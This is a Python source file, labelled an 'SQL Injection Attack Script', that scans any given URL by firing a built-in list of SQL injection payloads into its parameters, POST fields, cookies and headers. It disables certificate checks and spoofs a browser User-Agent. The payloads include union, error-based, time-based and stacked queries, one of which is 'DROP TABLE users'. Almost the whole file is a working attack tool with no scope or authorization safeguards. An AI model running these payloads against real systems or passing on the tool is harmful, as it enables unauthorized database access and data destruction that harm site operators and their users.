#!/usr/bin/env python

"""
SQL Injection Attack Script
- Tests a web application for SQL injection vulnerabilities
- Demonstrates common SQL injection techniques
"""

import requests
import argparse
import sys
import time
import re
import urllib.parse
from datetime import datetime
from bs4 import BeautifulSoup

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# SQL Injection payloads to test
SQL_PAYLOADS = [
    # Boolean-based blind
    "' OR '1'='1",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1",
    "\" OR \"1\"=\"1\" --",
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "or 1=1--",
    "' or 1=1--",
    "\" or 1=1--",
    "' or '1'='1",
    "' or 1='1",
    "' or 1=1 /*",
    
    # Error-based
    "' OR (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) -- -",
    "' UNION SELECT @@version -- -",
    "' UNION SELECT NULL,@@version -- -",
    "' UNION SELECT NULL,NULL,@@version -- -",
    
    # Union-based
    "' UNION SELECT 1,2,3 -- -",
    "' UNION SELECT 1,2,3,4 -- -",
    "' UNION SELECT 1,2,3,4,5 -- -",
    
    # Time-based blind
    "' OR SLEEP(3) -- -",
    "' OR (SELECT * FROM (SELECT(SLEEP(3)))a) -- -",
    "' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='mysql' AND SLEEP(3)) -- -",
    
    # Stacked queries
    "'; SELECT @@version; --",
    "'; DROP TABLE users; --"
]

def send_request(url, method, params={}, data={}, cookies={}, headers={}, payload="", param_name="", injection_point=""):
    """
    Send a request with the given parameters and payloads
    
    :param url: Target URL
    :param method: HTTP method (GET or POST)
    :param params: GET parameters
    :param data: POST data
    :param cookies: HTTP cookies
    :param headers: HTTP headers
    :param payload: SQL injection payload
    :param param_name: Name of the parameter being tested
    :param injection_point: Where the payload is injected (params, data, cookies, headers)
    """
    # Prepare the request based on injection point
    if injection_point == "params":
        params[param_name] = payload
    elif injection_point == "data":
        data[param_name] = payload
    elif injection_point == "cookies":
        cookies[param_name] = payload
    elif injection_point == "headers":
        headers[param_name] = payload
        
    try:
        start_time = time.time()
        if method.upper() == "GET":
            response = requests.get(
                url,
                params=params,
                cookies=cookies,
                headers=headers,
                timeout=10,
                verify=False,
                allow_redirects=True
            )
        else:  # POST
            response = requests.post(
                url,
                params=params,
                data=data,
                cookies=cookies,
                headers=headers,
                timeout=10,
                verify=False,
                allow_redirects=True
            )
        
        elapsed_time = time.time() - start_time
        return response, elapsed_time
    
    except requests.exceptions.RequestException as e:
        print(f"[!] Error: {e}")
        return None, 0

def analyze_response(response, baseline_response, elapsed_time, baseline_time, payload):
    """
    Analyze the response to determine if the injection was successful
    
    :param response: Response from the request with payload
    :param baseline_response: Response from the original request without payload
    :param elapsed_time: Time taken for the request with payload
    :param baseline_time: Time taken for the original request
    :param payload: SQL injection payload used
    :return: (success, confidence, details) tuple
    """
    # Initialize variables
    success = False
    confidence = 0
    details = []
    
    if response is None:
        return False, 0, ["Request failed"]
    
    # Check for significant time differences (time-based)
    if elapsed_time > (baseline_time * 2 + 2) and "SLEEP" in payload.upper():
        success = True
        confidence += 40
        details.append(f"Time-based: Response took {elapsed_time:.2f}s vs baseline {baseline_time:.2f}s")
    
    # Check for error messages
    sql_errors = [
        "SQL syntax",
        "mysql_fetch_array()",
        "mysql_fetch",
        "mysqli_fetch_array()",
        "mysqli_result",
        "mysql_num_rows()",
        "SQL command not properly ended",
        "ORA-01756",
        "Error Executing Database Query",
        "SQLite3::query",
        "ODBC SQL Server Driver",
        "Microsoft OLE DB Provider for SQL Server",
        "PostgreSQL.*ERROR"
    ]
    
    for error in sql_errors:
        if re.search(error, response.text, re.IGNORECASE):
            success = True
            confidence += 30
            details.append(f"SQL error detected: {error}")
    
    # Check for content differences
    if baseline_response is not None:
        # Significant content length difference
        len_diff = abs(len(response.text) - len(baseline_response.text))
        if len_diff > 100:
            confidence += 10
            details.append(f"Response size changed: {len(baseline_response.text)} → {len(response.text)} ({len_diff} chars)")
        
        # Check for new HTML elements that might be database content
        if "<table" in response.text and "<table" not in baseline_response.text:
            confidence += 15
            details.append("New table elements detected in response")
    
    # Check for signs of true/false conditions
    if "1=1" in payload and response.status_code == 200:
        if baseline_response is not None and baseline_response.status_code != 200:
            success = True
            confidence += 20
            details.append("TRUE condition (1=1) returned successful response")
    
    # Adjust confidence based on overall analysis
    if confidence > 0:
        success = True
    
    return success, min(confidence, 100), details

def sql_injection_test(target_url, method="GET", param_name=None, cookie_name=None, header_name=None, data_param_name=None):
    """
    Test a target URL for SQL injection vulnerabilities
    
    :param target_url: Target URL to test
    :param method: HTTP method to use (GET or POST)
    :param param_name: URL parameter to test for injection
    :param cookie_name: Cookie parameter to test for injection
    :param header_name: Header to test for injection
    :param data_param_name: POST data parameter to test for injection
    """
    print(f"[*] Starting SQL Injection test on {target_url}")
    print(f"[*] Method: {method}")
    
    # Determine injection points and parameters
    injection_points = []
    
    if param_name:
        injection_points.append(("params", param_name))
    if data_param_name and method.upper() == "POST":
        injection_points.append(("data", data_param_name))
    if cookie_name:
        injection_points.append(("cookies", cookie_name))
    if header_name:
        injection_points.append(("headers", header_name))
    
    # If no specific parameters provided, try to discover them
    if not injection_points:
        print("[*] No parameters specified. Attempting to discover injectable parameters...")
        
        try:
            response = requests.get(target_url, verify=False)
            
            # Extract GET parameters from the URL
            parsed_url = urllib.parse.urlparse(target_url)
            query_params = urllib.parse.parse_qs(parsed_url.query)
            
            for param in query_params:
                injection_points.append(("params", param))
                print(f"[+] Discovered URL parameter: {param}")
            
            # Extract form parameters
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                
                for form in forms:
                    form_method = form.get('method', 'get').upper()
                    inputs = form.find_all('input')
                    
                    for input_field in inputs:
                        input_name = input_field.get('name')
                        if input_name:
                            if form_method == "POST":
                                injection_points.append(("data", input_name))
                                print(f"[+] Discovered POST parameter: {input_name}")
                            else:
                                injection_points.append(("params", input_name))
                                print(f"[+] Discovered form parameter: {input_name}")
        
        except Exception as e:
            print(f"[!] Error discovering parameters: {e}")
    
    if not injection_points:
        print("[!] No injectable parameters found. Please specify parameters manually.")
        return
    
    # Test each injection point
    for injection_point, param in injection_points:
        print(f"\n[*] Testing {injection_point} parameter: {param}")
        
        # Create a baseline request
        params = {}
        data = {}
        cookies = {}
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
        
        if injection_point == "params":
            params[param] = "baseline"
        elif injection_point == "data":
            data[param] = "baseline"
        elif injection_point == "cookies":
            cookies[param] = "baseline"
        elif injection_point == "headers":
            headers[param] = "baseline"
        
        # Get baseline response
        baseline_response, baseline_time = send_request(
            target_url, method, params, data, cookies, headers
        )
        
        if baseline_response is None:
            print(f"[!] Could not establish baseline connection to {target_url}")
            continue
        
        print(f"[*] Baseline response time: {baseline_time:.4f} seconds")
        print(f"[*] Baseline response size: {len(baseline_response.text)} bytes")
        
        vulnerabilities = []
        
        # Test each payload
        for payload in SQL_PAYLOADS:
            print(f"[*] Testing payload: {payload}")
            
            response, elapsed_time = send_request(
                target_url, method, params.copy(), data.copy(), 
                cookies.copy(), headers.copy(), payload, param, injection_point
            )
            
            if response is None:
                continue
            
            success, confidence, details = analyze_response(
                response, baseline_response, elapsed_time, baseline_time, payload
            )
            
            if success:
                print(f"[+] Potential SQL Injection found!")
                print(f"[+] Confidence: {confidence}%")
                for detail in details:
                    print(f"[+] {detail}")
                
                vulnerabilities.append({
                    "payload": payload,
                    "confidence": confidence,
                    "details": details
                })
            else:
                print(f"[-] No injection detected with this payload")
        
        # Summarize results for this parameter
        if vulnerabilities:
            print(f"\n[+] {len(vulnerabilities)} potential vulnerabilities found in {param} ({injection_point})")
            
            # Sort by confidence
            vulnerabilities.sort(key=lambda x: x["confidence"], reverse=True)
            
            # Show the top 3 most confident findings
            print("[+] Top findings:")
            for i, vuln in enumerate(vulnerabilities[:3]):
                print(f"  {i+1}. Payload: {vuln['payload']} (Confidence: {vuln['confidence']}%)")
                for detail in vuln['details'][:2]:  # Show only first 2 details
                    print(f"     - {detail}")
        else:
            print(f"\n[-] No SQL Injection vulnerabilities found in {param} ({injection_point})")

if __name__ == "__main__":
    # Setup argument parser
    parser = argparse.ArgumentParser(description='SQL Injection Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-m', '--method', choices=['GET', 'POST'], default='GET', help='HTTP method (default: GET)')
    parser.add_argument('-p', '--param', help='URL parameter to test')
    parser.add_argument('-d', '--data', help='POST data parameter to test')
    parser.add_argument('-c', '--cookie', help='Cookie parameter to test')
    parser.add_argument('-H', '--header', help='Header parameter to test')
    
    args = parser.parse_args()
    
    # Execute SQL injection test
    sql_injection_test(
        args.url,
        args.method,
        args.param,
        args.cookie,
        args.header,
        args.data
    )
